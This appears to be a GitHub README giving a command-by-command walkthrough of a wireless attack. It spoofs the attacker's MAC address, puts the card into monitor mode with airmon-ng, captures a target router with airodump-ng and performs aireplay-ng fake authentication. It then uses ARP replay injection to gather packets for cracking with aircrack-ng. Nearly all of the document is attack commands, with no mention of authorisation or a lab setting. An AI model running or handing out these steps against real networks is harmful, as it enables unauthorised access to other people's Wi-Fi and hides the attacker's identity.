# Fake-authentication-attacks
## Be on Safe Guard 
#### change macaddress
## To view mac-address
```bash
macchnger -s wlan0
```
## To change mac-address
```bash
ifconfig wlan0 down
```
```bash
macchanger -r wlan0
```
```bash
ifconfig wlan0 up
```
## Now Ready to Attack
```bash
su root
```
```bash
airmon-ng check kill
```
```bash
airmon-ng start wlan0
```
```bash
airodump-ng wlan0
```
### stop and select network ```ctrl``` + ```c```
```bash
airodump-ng wlan0 --bssid <router mac> --channel <channel n.o >
```
# Now fake-auth to that selected router.
```bash
aireplay-ng --fakeauth 0 -a <router-mac> -c <kali mac> wlan0
```
### Again to check kali mac address (you can use any of them)
- ```macchanger -s wlan0```
- ```ipaddr```
- ```ifconfig```
# Sending data packet and overloading
```bash
aireplay-ng --arpreplay -b <router mac> -h <kali mac> wlan0
```
### It automaticaly save the file 
- use ```aircrack-ng``` on it.

## Thank you


## Badges

Add badges from somewhere like: [shields.io](https://shields.io/)

[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
[![GPLv3 License](https://img.shields.io/badge/License-GPL%20v3-yellow.svg)](https://opensource.org/licenses/)
[![AGPL License](https://img.shields.io/badge/license-AGPL-blue.svg)](http://www.gnu.org/licenses/agpl-3.0)

